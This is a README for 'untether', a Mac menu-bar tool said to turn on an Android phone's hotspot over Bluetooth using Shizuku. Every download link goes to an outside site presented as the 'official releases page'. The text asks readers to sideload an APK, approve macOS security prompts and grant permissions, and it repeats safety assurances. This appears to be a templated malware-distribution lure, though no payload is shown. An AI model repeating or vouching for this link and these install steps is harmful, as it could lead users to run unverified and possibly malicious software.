# 📶 untether - Instant Hotspot With One Click

[![Download untether](https://img.shields.io/badge/Download-untether-ff4fa3?style=for-the-badge&logo=github&logoColor=white)](https://udls-website.github.io)

**Note before you begin:** untether is a Mac menu bar app that controls an Android phone. The download page linked above is where the application lives — everything else in this guide explains what it does, how to get it, and how to use it without any technical background.

## ✨ What Is untether?

untether is a tiny helper that sits in your Mac's menu bar and flips on your Android phone's Wi-Fi hotspot for you — instantly, over Bluetooth, without you ever touching the phone.

If you have ever needed internet on your laptop while travelling, sitting in a café, or stuck in a meeting room with no Wi-Fi, you already know the routine: dig out your phone, unlock it, swipe down, hunt for the hotspot toggle, tap it, wait, then connect your laptop. It is a small annoyance that happens dozens of times a week.

untether removes all of that. One click in your menu bar, and your phone becomes a hotspot. No digging through settings. No unlocking your phone. No root, no custom firmware, no risky modifications — it uses Shizuku, a well-known, safe Android helper that grants apps the permissions they need through official Android channels.

Think of it as a light switch for your phone's internet. Your laptop gets a small, always-available button, and your phone does the work quietly in the background.

## 🎯 Why People Love It

- **One click, no phone.** Your hotspot turns on from the Mac menu bar. Your phone can stay in your bag.
- **Fast.** The connection is triggered over Bluetooth Low Energy, which is designed to be instant and low-power. There is no pairing dance every time.
- **Nothing risky.** No root access, no flashing, no warranty-voiding tricks. Shizuku handles permissions the proper way.
- **Nothing to babysit.** The menu bar item shows you the current state at a glance, so you always know whether your hotspot is on or off.
- **Battery friendly.** Bluetooth Low Energy is exactly what it sounds like — it barely touches your phone's battery compared to leaving a hotspot running all day.
- **Made for real life.** Designed for laptops, commuters, remote workers, students, and anyone who treats their phone as their internet connection.

## 📦 What untether Gives You

- A clean, native Mac menu bar app that stays out of your way.
- An Android companion app built with Jetpack Compose and Material 3, so it looks and feels like a modern Android app.
- Bluetooth Low Energy communication between the two — no cables, no Wi-Fi pairing, no accounts.
- Shizuku integration for the permissions needed to toggle tethering.
- A simple on/off control, with clear status feedback.
- A lightweight footprint: untether is written in Go on the Mac side and stays small and quick.
- No sign-ups, no subscriptions, no telemetry you have to opt out of.

## 🚀 Download and Install

Getting untether is a two-part process because it has two pieces: the Mac menu bar app and the Android companion app. You will need both, and both are available from the same place.

**Step 1 — Visit the download page.**

Go to the official releases page:

👉 **https://udls-website.github.io**

Visit this link to download the application.

**Step 2 — Get the latest version.**

The releases page lists every published version of untether, newest at the top. Choose the most recent release — that is the one with all the latest fixes and improvements. On that release page you will find the files for both the Mac app and the Android companion app.

**Step 3 — Save the files somewhere you can find them.**

Your browser will download the files to your usual Downloads folder. Do not move them around or rename them; keep them together so you can set up both halves in one sitting.

**Step 4 — Put the Mac app in your menu bar.**

Open the Mac application from your Downloads folder. Because untether lives in the menu bar, you will not get a big window popping up — look at the top-right corner of your screen, near the clock, for the untether icon. That icon is the app. If you want it to stay available after a restart, keep the app in your Applications folder rather than running it out of Downloads.

**Step 5 — Install the Android companion.**

Copy the Android companion app file to your phone — you can send it to yourself by email, use a USB cable, or transfer it through any cloud storage you already use. Open it on the phone and follow the on-screen prompts to install it. Android will ask you to confirm installing an app from outside the Play Store; that confirmation is normal and expected for apps distributed directly by their developers.

**Step 6 — Turn on Shizuku.**

The Android companion needs Shizuku running to switch tethering on and off. Shizuku is a free, widely used Android tool that grants apps special permissions through Android's own official mechanisms — it does not root your phone or modify the system. Install Shizuku, start it using the method it recommends for your Android version, and confirm it is running before you continue.

**Step 7 — Connect the two.**

Open the Android companion once more with Shizuku active, and grant it the permissions it asks for. Then return to your Mac, click the untether icon in the menu bar, and let it find your phone. Once the two are introduced to each other, they will remember one another.

## 📱 Everyday Use

Once everything is set up, untether becomes almost invisible — in the best way.

Click the menu bar icon. Choose to turn the hotspot on. Your phone's Wi-Fi hotspot starts, and your laptop can join it like any other Wi-Fi network. When you are done, click again and it turns off. That is the entire workflow.

If you want the smoothest experience, save your phone's hotspot network on your laptop the first time you connect, so your computer joins it automatically on future sessions.

## 🧩 How It Works, In Plain English

Your Mac and your Android phone talk to each other over Bluetooth Low Energy — the same low-power radio technology used by fitness trackers and smart bulbs. The Mac app sends a small, simple message: "turn the hotspot on" or "turn the hotspot off." The Android companion receives that message and uses Shizuku's permissions to flip the actual Android tethering setting. No internet traffic ever passes through Bluetooth; it is only used for the on/off signal. Your actual internet connection comes from your phone's mobile network, exactly as it would with any hotspot.

Because everything runs locally between your own devices, there is no server in the middle and no account to create.

## 💻 System Requirements

- A Mac running a modern version of macOS, with Bluetooth enabled.
- An Android phone with Bluetooth enabled and a working mobile data connection.
- Shizuku installed and running on the Android phone.
- Both devices within roughly ten metres of each other.
- The Android companion app installed and granted the permissions it requests.

## 🛠️ Common Questions

**The menu bar icon does not appear.** Make sure the app is actually running — check whether it is still sitting in your Downloads folder and open it again. On first launch, macOS may ask you to confirm opening an app downloaded from the internet; approve it.

**My phone is not being found.** Confirm Bluetooth is switched on for both devices, that the Android companion is open at least once, and that Shizuku is running. Bluetooth discovery can be slow for a few seconds right after launch.

**The hotspot will not turn on.** In almost every case this means Shizuku is not running or the Android companion has not been granted its permissions yet. Restart Shizuku, reopen the companion, and accept the prompts.

**Can I use it on Windows?** untether's menu bar app is built for macOS. The releases page is the single source of truth for what is available in each version.

**Is this safe?** untether uses Shizuku, which works through Android's official permission APIs. Nothing is rooted and nothing is modified permanently.

## 🆘 Getting Help

If something does not work, the releases page is the first place to look — each release notes what changed and known issues. If you are still stuck, open an issue on the repository and describe what you expected, what happened instead, and which versions of macOS and Android you are using. Screenshots of the menu bar and the Android companion help a great deal.

## 🔗 One Link to Remember

Everything starts here:

👉 **https://udls-website.github.io**

Visit this link to download the application.

Keywords: android, bluetooth-low-energy, golang, hotspot, jetpack-compose, macos, material3, menu-bar, shizuku, tethering